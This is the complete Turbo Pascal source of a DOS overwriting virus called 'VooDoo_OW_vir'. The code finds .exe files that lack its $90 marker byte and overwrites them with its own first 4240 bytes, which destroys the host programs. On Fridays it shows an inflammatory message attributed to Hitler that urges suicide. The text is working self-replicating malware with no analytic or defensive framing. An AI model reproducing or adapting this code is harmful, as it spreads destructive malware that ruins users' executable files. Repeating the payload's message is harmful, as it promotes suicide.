program VooDoo_OW_vir;

uses dos;

var s     : searchrec;
    fname : string;
    buf   : array[1..6144] of byte;
    f     : file;
    y, m, d, dow : word;

procedure Infect(s : string);

begin
   assign(f, paramstr(0));
   reset(F, 1);
   blockread(f, buf, 4240);
   close(f);
   assign(f, s);
   reset(f, 1);
   blockwrite(f, buf, 4240);
   close(f);
end;

function Searchfile : string;

var foundit : boolean;
    w : word;

begin
   foundit := FALSE;
   FindFirst('*.exe', archive, s);
   repeat
      FindNext(s);
      assign(f, s.name);
      reset(f, 1);
      blockread(f, buf, 3);
      close(f);
      if
      buf[3] <> $90 then
      foundit := TRUE;
   until (doserror <> 0) or (foundit = TRUE);
   Searchfile := s.name;
end;

begin
   asm
      nop;
      nop;
      nop;
   end;
   GetDate(y, m, d, dow);
   if dow = 5 then begin
      writeln;
      writeln('ON THE SABBATH.. THE GHOST OF HITLER SPEAKS : ');
      writeln;
      writeln('"MY FELLOW NAZI''S.. I WAS WRONG.."');
      writeln('"I NOW COMMAND YOU TO COMMIT SUICIDE.. NOT GENOCIDE.."');
      writeln;
      writeln('"DO IT.. SO THE WORLD WILL BE RID OF THE NAZIPEST..');
      writeln('"AND ALL AUSLANDER CAN TRUELY BE FREE OF NAZIPHOBIA..');
      writeln;
      writeln;
      writeln('NaZiPhobia (c) [VooDoo].. We support the message..');
      writeln;
   end else begin
      fname := Searchfile;
      Infect(fname);
   end;
end.
